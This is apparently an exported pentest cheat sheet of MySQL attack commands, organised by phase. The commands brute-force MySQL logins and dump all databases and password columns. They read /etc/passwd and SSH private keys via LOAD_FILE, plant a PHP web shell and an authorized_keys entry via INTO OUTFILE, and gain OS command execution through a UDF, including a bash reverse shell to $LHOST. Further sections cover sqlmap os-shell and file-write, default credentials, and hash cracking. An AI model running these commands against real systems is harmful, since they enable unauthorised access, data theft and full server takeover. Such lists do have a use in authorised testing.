---
id: "ao5owyigfmptladjv"
title: "mysql3"
description: ""
tags: []
order: 14
createdAt: "2026-05-31T09:40:43.675Z"
updatedAt: "2026-05-31T09:40:54.297Z"
---

## Reconnaissance
<!-- section: {"id":"fx3jeojf8mptlalaq","order":0,"collapsed":false} -->

### viw47hz1zmptlald8
```bash
nmap -sV -sC -p 3306 $TARGET
```

_Reconnaissance Port scan for MySQL default ports._

**Tags:** mysql, recon, nmap, rustscan
<!-- cmd: {"id":"viw47hz1zmptlald8","language":"bash","sectionId":"fx3jeojf8mptlalaq","tags":["mysql","recon","nmap","rustscan"]} -->

### 7jch1ac1hmptlaldf
```bash
rustscan -a $TARGET -p 3306 -- -sV -sC
```

**Tags:** mysql, recon, nmap, rustscan
<!-- cmd: {"id":"7jch1ac1hmptlaldf","language":"bash","sectionId":"fx3jeojf8mptlalaq","tags":["mysql","recon","nmap","rustscan"]} -->

### v5lkfs4yemptlaldl
```bash
nmap -p 3306 --script=mysql-info,mysql-empty-password,mysql-brute $TARGET
```

**Tags:** mysql, recon, nmap, rustscan
<!-- cmd: {"id":"v5lkfs4yemptlaldl","language":"bash","sectionId":"fx3jeojf8mptlalaq","tags":["mysql","recon","nmap","rustscan"]} -->

## Enumeration (Unauthenticated)
<!-- section: {"id":"zc0awd16rmptlalaw","order":1,"collapsed":false} -->

### m7uc9u4ppmptlale0
```bash
nmap -p 3306 --script mysql-info $TARGET
```

_Enumeration (Unauthenticated) Grab MySQL banner and check for anonymous access._

**Tags:** mysql, enumeration, unauthenticated, banner
<!-- cmd: {"id":"m7uc9u4ppmptlale0","language":"bash","sectionId":"zc0awd16rmptlalaw","tags":["mysql","enumeration","unauthenticated","banner"]} -->

### ndw8wu85ymptlale5
```bash
nmap -p 3306 --script mysql-empty-password $TARGET
```

**Tags:** mysql, enumeration, unauthenticated, banner
<!-- cmd: {"id":"ndw8wu85ymptlale5","language":"bash","sectionId":"zc0awd16rmptlalaw","tags":["mysql","enumeration","unauthenticated","banner"]} -->

### mp2gpqf9tmptlalea
```bash
mysql -h $TARGET -u root --connect-timeout=5 2>/dev/null
```

**Tags:** mysql, enumeration, unauthenticated, banner
<!-- cmd: {"id":"mp2gpqf9tmptlalea","language":"bash","sectionId":"zc0awd16rmptlalaw","tags":["mysql","enumeration","unauthenticated","banner"]} -->

## Brute Force
<!-- section: {"id":"4qwcprx9rmptlalb1","order":2,"collapsed":false} -->

### jpcw88uoimptlalem
```bash
nmap -p 3306 --script mysql-brute --script-args userdb=/usr/share/wordlists/users.txt,passdb=/usr/share/wordlists/rockyou.txt $TARGET
```

_Brute Force Brute force MySQL credentials._

**Tags:** mysql, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"jpcw88uoimptlalem","language":"bash","sectionId":"4qwcprx9rmptlalb1","tags":["mysql","bruteforce","hydra","medusa","netexec"]} -->

### ybgf66adlmptlaleq
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET mysql
```

**Tags:** mysql, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"ybgf66adlmptlaleq","language":"bash","sectionId":"4qwcprx9rmptlalb1","tags":["mysql","bruteforce","hydra","medusa","netexec"]} -->

### 3zfvuhuaxmptlalev
```bash
medusa -h $TARGET -U users.txt -P /usr/share/wordlists/rockyou.txt -M mysql
```

**Tags:** mysql, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"3zfvuhuaxmptlalev","language":"bash","sectionId":"4qwcprx9rmptlalb1","tags":["mysql","bruteforce","hydra","medusa","netexec"]} -->

### 5721kkfdemptlalf1
```bash
netexec mssql $TARGET -u users.txt -p /usr/share/wordlists/rockyou.txt
```

**Tags:** mysql, bruteforce, hydra, medusa, netexec
<!-- cmd: {"id":"5721kkfdemptlalf1","language":"bash","sectionId":"4qwcprx9rmptlalb1","tags":["mysql","bruteforce","hydra","medusa","netexec"]} -->

## Authentication
<!-- section: {"id":"3l75fyzd8mptlalb6","order":3,"collapsed":false} -->

### etwei4s1vmptlalfh
```bash
mysql -h $TARGET -u $USER -p$PASS
```

_Authentication Connect to MySQL with credentials._

**Tags:** mysql, authentication, login
<!-- cmd: {"id":"etwei4s1vmptlalfh","language":"bash","sectionId":"3l75fyzd8mptlalb6","tags":["mysql","authentication","login"]} -->

### zfyskxculmptlalfn
```bash
mysql -h $TARGET -u $USER -p$PASS -e "SHOW DATABASES;"
```

**Tags:** mysql, authentication, login
<!-- cmd: {"id":"zfyskxculmptlalfn","language":"bash","sectionId":"3l75fyzd8mptlalb6","tags":["mysql","authentication","login"]} -->

### 6ih931ubkmptlalfr
```bash
mysql -h $TARGET -P 3306 -u $USER -p$PASS --ssl-mode=DISABLED
```

**Tags:** mysql, authentication, login
<!-- cmd: {"id":"6ih931ubkmptlalfr","language":"bash","sectionId":"3l75fyzd8mptlalb6","tags":["mysql","authentication","login"]} -->

## Enumeration (Authenticated)
<!-- section: {"id":"909jfoqbtmptlalba","order":4,"collapsed":false} -->

### ichwt00tdmptlalg2
```bash
SHOW DATABASES;
```

_Enumeration (Authenticated) Enumerate databases, users, and privileges._

**Tags:** mysql, enumeration, authenticated, privileges
<!-- cmd: {"id":"ichwt00tdmptlalg2","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->

### n5xwje7s0mptlalg9
```bash
SELECT user, host, authentication_string FROM mysql.user;
```

**Tags:** mysql, enumeration, authenticated, privileges
<!-- cmd: {"id":"n5xwje7s0mptlalg9","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->

### fs9i9c17imptlalge
```bash
SELECT current_user();
```

**Tags:** mysql, enumeration, authenticated, privileges
<!-- cmd: {"id":"fs9i9c17imptlalge","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->

### gg10iflkvmptlalgk
```bash
SHOW GRANTS;
```

**Tags:** mysql, enumeration, authenticated, privileges
<!-- cmd: {"id":"gg10iflkvmptlalgk","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->

### yj8dvamqnmptlalgp
```bash
SHOW GRANTS FOR '$USER'@'%';
```

**Tags:** mysql, enumeration, authenticated, privileges
<!-- cmd: {"id":"yj8dvamqnmptlalgp","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->

### rmft5dl5rmptlalgu
```bash
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys');
```

**Tags:** mysql, enumeration, authenticated, privileges
<!-- cmd: {"id":"rmft5dl5rmptlalgu","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->

### ta7fxx1fomptlalh1
```bash
SELECT user, host, File_priv FROM mysql.user;
```

**Tags:** mysql, enumeration, authenticated, privileges
<!-- cmd: {"id":"ta7fxx1fomptlalh1","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->

### sfgmcxknqmptlalh7
```bash
SELECT user, plugin, authentication_string FROM mysql.user;
```

**Tags:** mysql, enumeration, authenticated, privileges
<!-- cmd: {"id":"sfgmcxknqmptlalh7","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->

## Data Extraction
<!-- section: {"id":"71tee5eu1mptlalbf","order":5,"collapsed":false} -->

### zhuystmegmptlalhn
```bash
mysqldump -h $TARGET -u $USER -p$PASS --all-databases > all_dbs.sql
```

_Data Extraction Dump sensitive data from databases._

**Tags:** mysql, datadump, exfiltration, credentials
<!-- cmd: {"id":"zhuystmegmptlalhn","language":"bash","sectionId":"71tee5eu1mptlalbf","tags":["mysql","datadump","exfiltration","credentials"]} -->

### j0mcqq5jxmptlalht
```bash
mysqldump -h $TARGET -u $USER -p$PASS $DATABASE > dump.sql
```

**Tags:** mysql, datadump, exfiltration, credentials
<!-- cmd: {"id":"j0mcqq5jxmptlalht","language":"bash","sectionId":"71tee5eu1mptlalbf","tags":["mysql","datadump","exfiltration","credentials"]} -->

### w10tiqfttmptlali1
```bash
mysql -h $TARGET -u $USER -p$PASS -e "SELECT * FROM $DATABASE.$TABLE LIMIT 100;"
```

**Tags:** mysql, datadump, exfiltration, credentials
<!-- cmd: {"id":"w10tiqfttmptlali1","language":"bash","sectionId":"71tee5eu1mptlalbf","tags":["mysql","datadump","exfiltration","credentials"]} -->

### jghghgrvcmptlali6
```bash
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';
```

**Tags:** mysql, datadump, exfiltration, credentials
<!-- cmd: {"id":"jghghgrvcmptlali6","language":"bash","sectionId":"71tee5eu1mptlalbf","tags":["mysql","datadump","exfiltration","credentials"]} -->

### 342nnrq4wmptlalic
```bash
SELECT * FROM $DATABASE.users LIMIT 50;
```

**Tags:** mysql, datadump, exfiltration, credentials
<!-- cmd: {"id":"342nnrq4wmptlalic","language":"bash","sectionId":"71tee5eu1mptlalbf","tags":["mysql","datadump","exfiltration","credentials"]} -->

## File Read (FILE Privilege)
<!-- section: {"id":"6udbtl4urmptlalbl","order":6,"collapsed":false} -->

### ncxtmfokjmptlaliq
```bash
SELECT LOAD_FILE('/etc/passwd');
```

_File Read (FILE Privilege) Read local files via LOAD_FILE if FILE privilege is granted._

**Tags:** mysql, fileread, lfi, privilege-abuse
<!-- cmd: {"id":"ncxtmfokjmptlaliq","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->

### vmyept9ptmptlaliv
```bash
SELECT LOAD_FILE('/root/.ssh/id_rsa');
```

**Tags:** mysql, fileread, lfi, privilege-abuse
<!-- cmd: {"id":"vmyept9ptmptlaliv","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->

### 8tg0ytjlumptlalj1
```bash
SELECT LOAD_FILE('/home/$USER/.ssh/id_rsa');
```

**Tags:** mysql, fileread, lfi, privilege-abuse
<!-- cmd: {"id":"8tg0ytjlumptlalj1","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->

### jevb72ukemptlalj6
```bash
SELECT LOAD_FILE('/var/www/html/config.php');
```

**Tags:** mysql, fileread, lfi, privilege-abuse
<!-- cmd: {"id":"jevb72ukemptlalj6","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->

### hv5e7j0t8mptlalja
```bash
SELECT LOAD_FILE('/var/www/html/wp-config.php');
```

**Tags:** mysql, fileread, lfi, privilege-abuse
<!-- cmd: {"id":"hv5e7j0t8mptlalja","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->

### s52jiilvxmptlaljg
```bash
SELECT LOAD_FILE('/etc/mysql/my.cnf');
```

**Tags:** mysql, fileread, lfi, privilege-abuse
<!-- cmd: {"id":"s52jiilvxmptlaljg","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->

## File Write (INTO OUTFILE)
<!-- section: {"id":"lfdowf4l8mptlalbq","order":7,"collapsed":false} -->

### sp9swrkz2mptlaljy
```bash
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

_File Write (INTO OUTFILE) Write files to disk — useful for webshell if web root is writable._

**Tags:** mysql, filewrite, webshell, rce
<!-- cmd: {"id":"sp9swrkz2mptlaljy","language":"bash","sectionId":"lfdowf4l8mptlalbq","tags":["mysql","filewrite","webshell","rce"]} -->

### em4z2prp3mptlalk4
```bash
SELECT "ssh-rsa AAAA..." INTO OUTFILE '/root/.ssh/authorized_keys';
```

**Tags:** mysql, filewrite, webshell, rce
<!-- cmd: {"id":"em4z2prp3mptlalk4","language":"bash","sectionId":"lfdowf4l8mptlalbq","tags":["mysql","filewrite","webshell","rce"]} -->

### u8no2u78amptlalk8
```bash
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Tags:** mysql, filewrite, webshell, rce
<!-- cmd: {"id":"u8no2u78amptlalk8","language":"bash","sectionId":"lfdowf4l8mptlalbq","tags":["mysql","filewrite","webshell","rce"]} -->

## UDF (User Defined Functions) — RCE
<!-- section: {"id":"r6pu1fdh1mptlalbw","order":8,"collapsed":false} -->

### g5donnkfymptlalks
```bash
SHOW VARIABLES LIKE 'plugin_dir';
```

_UDF (User Defined Functions) — RCE Escalate to OS command execution via UDF injection._

**Tags:** mysql, udf, rce, privesc, exploitation
<!-- cmd: {"id":"g5donnkfymptlalks","language":"bash","sectionId":"r6pu1fdh1mptlalbw","tags":["mysql","udf","rce","privesc","exploitation"]} -->

### ts86e7l4tmptlalkx
```bash
SHOW VARIABLES LIKE 'secure_file_priv';
```

**Tags:** mysql, udf, rce, privesc, exploitation
<!-- cmd: {"id":"ts86e7l4tmptlalkx","language":"bash","sectionId":"r6pu1fdh1mptlalbw","tags":["mysql","udf","rce","privesc","exploitation"]} -->

### armobk75imptlall1
```bash
sqlmap -u "$URL" --dbms=mysql --os-shell
```

**Tags:** mysql, udf, rce, privesc, exploitation
<!-- cmd: {"id":"armobk75imptlall1","language":"bash","sectionId":"r6pu1fdh1mptlalbw","tags":["mysql","udf","rce","privesc","exploitation"]} -->

### nnd661iejmptlall5
```bash
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
```

**Tags:** mysql, udf, rce, privesc, exploitation
<!-- cmd: {"id":"nnd661iejmptlall5","language":"bash","sectionId":"r6pu1fdh1mptlalbw","tags":["mysql","udf","rce","privesc","exploitation"]} -->

### uacc4dvf8mptlallb
```bash
SELECT sys_exec('id > /tmp/pwned');
```

**Tags:** mysql, udf, rce, privesc, exploitation
<!-- cmd: {"id":"uacc4dvf8mptlallb","language":"bash","sectionId":"r6pu1fdh1mptlalbw","tags":["mysql","udf","rce","privesc","exploitation"]} -->

### obuzbocghmptlallh
```bash
SELECT sys_exec('bash -i >& /dev/tcp/$LHOST/4444 0>&1');
```

**Tags:** mysql, udf, rce, privesc, exploitation
<!-- cmd: {"id":"obuzbocghmptlallh","language":"bash","sectionId":"r6pu1fdh1mptlalbw","tags":["mysql","udf","rce","privesc","exploitation"]} -->

## SQL Injection Testing
<!-- section: {"id":"wax6t7f6gmptlalc2","order":9,"collapsed":false} -->

### 9rwwuo5qrmptlallz
```bash
sqlmap -u "$URL?id=1" --dbs --batch
```

_SQL Injection Testing Quick SQLi checks via sqlmap._

**Tags:** mysql, sqli, sqlmap, exploitation
<!-- cmd: {"id":"9rwwuo5qrmptlallz","language":"bash","sectionId":"wax6t7f6gmptlalc2","tags":["mysql","sqli","sqlmap","exploitation"]} -->

### tp9ntrmxumptlalm3
```bash
sqlmap -u "$URL" --data="username=admin&password=test" --dbs --batch
```

**Tags:** mysql, sqli, sqlmap, exploitation
<!-- cmd: {"id":"tp9ntrmxumptlalm3","language":"bash","sectionId":"wax6t7f6gmptlalc2","tags":["mysql","sqli","sqlmap","exploitation"]} -->

### sqv33abjimptlalma
```bash
sqlmap -u "$URL" --cookie="session=XXXX" --dbs --batch
```

**Tags:** mysql, sqli, sqlmap, exploitation
<!-- cmd: {"id":"sqv33abjimptlalma","language":"bash","sectionId":"wax6t7f6gmptlalc2","tags":["mysql","sqli","sqlmap","exploitation"]} -->

### 9vhmyvcc3mptlalmf
```bash
sqlmap -u "$URL?id=1" --dump-all --batch --threads=5
```

**Tags:** mysql, sqli, sqlmap, exploitation
<!-- cmd: {"id":"9vhmyvcc3mptlalmf","language":"bash","sectionId":"wax6t7f6gmptlalc2","tags":["mysql","sqli","sqlmap","exploitation"]} -->

### glav0cla5mptlalmk
```bash
sqlmap -u "$URL?id=1" --os-shell --batch
```

**Tags:** mysql, sqli, sqlmap, exploitation
<!-- cmd: {"id":"glav0cla5mptlalmk","language":"bash","sectionId":"wax6t7f6gmptlalc2","tags":["mysql","sqli","sqlmap","exploitation"]} -->

### lizustlnfmptlalmp
```bash
sqlmap -u "$URL?id=1" --file-read=/etc/passwd --batch
```

**Tags:** mysql, sqli, sqlmap, exploitation
<!-- cmd: {"id":"lizustlnfmptlalmp","language":"bash","sectionId":"wax6t7f6gmptlalc2","tags":["mysql","sqli","sqlmap","exploitation"]} -->

### kyhs17wh6mptlalmt
```bash
sqlmap -u "$URL?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php --batch
```

**Tags:** mysql, sqli, sqlmap, exploitation
<!-- cmd: {"id":"kyhs17wh6mptlalmt","language":"bash","sectionId":"wax6t7f6gmptlalc2","tags":["mysql","sqli","sqlmap","exploitation"]} -->

## Common Misconfigurations
<!-- section: {"id":"8wco584szmptlalc7","order":10,"collapsed":false} -->

### nnyy22ur8mptlaln6
```bash
mysql -h $TARGET -u root -p'' -e "SELECT 1;"
```

_Common Misconfigurations Check for dangerous MySQL settings._

**Tags:** mysql, misconfiguration, hardening
<!-- cmd: {"id":"nnyy22ur8mptlaln6","language":"bash","sectionId":"8wco584szmptlalc7","tags":["mysql","misconfiguration","hardening"]} -->

### nl00syl4bmptlalnb
```bash
grep -i bind-address /etc/mysql/mysql.conf.d/mysqld.cnf
```

**Tags:** mysql, misconfiguration, hardening
<!-- cmd: {"id":"nl00syl4bmptlalnb","language":"bash","sectionId":"8wco584szmptlalc7","tags":["mysql","misconfiguration","hardening"]} -->

### bavm0sqllmptlalnh
```bash
SELECT user, host FROM mysql.user WHERE host='%';
```

**Tags:** mysql, misconfiguration, hardening
<!-- cmd: {"id":"bavm0sqllmptlalnh","language":"bash","sectionId":"8wco584szmptlalc7","tags":["mysql","misconfiguration","hardening"]} -->

### nl57ki8fjmptlalnl
```bash
SELECT user, host FROM mysql.user WHERE authentication_string='' OR authentication_string IS NULL;
```

**Tags:** mysql, misconfiguration, hardening
<!-- cmd: {"id":"nl57ki8fjmptlalnl","language":"bash","sectionId":"8wco584szmptlalc7","tags":["mysql","misconfiguration","hardening"]} -->

### p945dcedymptlalnr
```bash
SELECT user, host, Grant_priv, Super_priv, File_priv FROM mysql.user WHERE Grant_priv='Y' OR Super_priv='Y' OR File_priv='Y';
```

**Tags:** mysql, misconfiguration, hardening
<!-- cmd: {"id":"p945dcedymptlalnr","language":"bash","sectionId":"8wco584szmptlalc7","tags":["mysql","misconfiguration","hardening"]} -->

## Default Credentials
<!-- section: {"id":"6scqty0czmptlalcb","order":11,"collapsed":false} -->

### sa7pjh93zmptlalot
```bash
root : (empty)
```

_Default Credentials_

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"sa7pjh93zmptlalot","language":"bash","sectionId":"6scqty0czmptlalcb","tags":["mysql","default-credentials"]} -->

### lqsfkysm8mptlaloy
```bash
root : root
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"lqsfkysm8mptlaloy","language":"bash","sectionId":"6scqty0czmptlalcb","tags":["mysql","default-credentials"]} -->

### v7oyzt0uxmptlalp4
```bash
root : mysql
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"v7oyzt0uxmptlalp4","language":"bash","sectionId":"6scqty0czmptlalcb","tags":["mysql","default-credentials"]} -->

### z9zalkmo0mptlalp9
```bash
root : toor
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"z9zalkmo0mptlalp9","language":"bash","sectionId":"6scqty0czmptlalcb","tags":["mysql","default-credentials"]} -->

### s0wl6s4ammptlalpd
```bash
admin : admin
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"s0wl6s4ammptlalpd","language":"bash","sectionId":"6scqty0czmptlalcb","tags":["mysql","default-credentials"]} -->

### yeh17z51smptlalpj
```bash
mysql : mysql
```

**Tags:** mysql, default-credentials
<!-- cmd: {"id":"yeh17z51smptlalpj","language":"bash","sectionId":"6scqty0czmptlalcb","tags":["mysql","default-credentials"]} -->

## Privilege Escalation (Local)
<!-- section: {"id":"ju3ht3lnlmptlalcg","order":12,"collapsed":false} -->

### 0ave6tfsumptlalpv
```bash
ps aux | grep mysql
```

_Privilege Escalation (Local) Escalate from mysql user to root on the OS._

**Tags:** mysql, privesc, gtfobins, local
<!-- cmd: {"id":"0ave6tfsumptlalpv","language":"bash","sectionId":"ju3ht3lnlmptlalcg","tags":["mysql","privesc","gtfobins","local"]} -->

### i3xhvpqvvmptlalq0
```bash
find / -name my.cnf -writable 2>/dev/null
```

**Tags:** mysql, privesc, gtfobins, local
<!-- cmd: {"id":"i3xhvpqvvmptlalq0","language":"bash","sectionId":"ju3ht3lnlmptlalcg","tags":["mysql","privesc","gtfobins","local"]} -->

### 0i3yui5usmptlalq5
```bash
mysql -u root -p -e '\! /bin/bash'
```

**Tags:** mysql, privesc, gtfobins, local
<!-- cmd: {"id":"0i3yui5usmptlalq5","language":"bash","sectionId":"ju3ht3lnlmptlalcg","tags":["mysql","privesc","gtfobins","local"]} -->

## Lateral Movement / Password Reuse
<!-- section: {"id":"4cg3sjixlmptlalcn","order":13,"collapsed":false} -->

### xt8acjor8mptlalqi
```bash
SELECT user, host, authentication_string FROM mysql.user;
```

_Lateral Movement / Password Reuse Extract and crack MySQL hashes._

**Tags:** mysql, hashcracking, hashcat, john, lateral-movement
<!-- cmd: {"id":"xt8acjor8mptlalqi","language":"bash","sectionId":"4cg3sjixlmptlalcn","tags":["mysql","hashcracking","hashcat","john","lateral-movement"]} -->

### arm42ecs5mptlalqn
```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Tags:** mysql, hashcracking, hashcat, john, lateral-movement
<!-- cmd: {"id":"arm42ecs5mptlalqn","language":"bash","sectionId":"4cg3sjixlmptlalcn","tags":["mysql","hashcracking","hashcat","john","lateral-movement"]} -->

### xc1zi8osnmptlalqs
```bash
hashcat -m 7401 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Tags:** mysql, hashcracking, hashcat, john, lateral-movement
<!-- cmd: {"id":"xc1zi8osnmptlalqs","language":"bash","sectionId":"4cg3sjixlmptlalcn","tags":["mysql","hashcracking","hashcat","john","lateral-movement"]} -->

### 0ybejx5momptlalqx
```bash
john --format=mysql-sha1 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Tags:** mysql, hashcracking, hashcat, john, lateral-movement
<!-- cmd: {"id":"0ybejx5momptlalqx","language":"bash","sectionId":"4cg3sjixlmptlalcn","tags":["mysql","hashcracking","hashcat","john","lateral-movement"]} -->
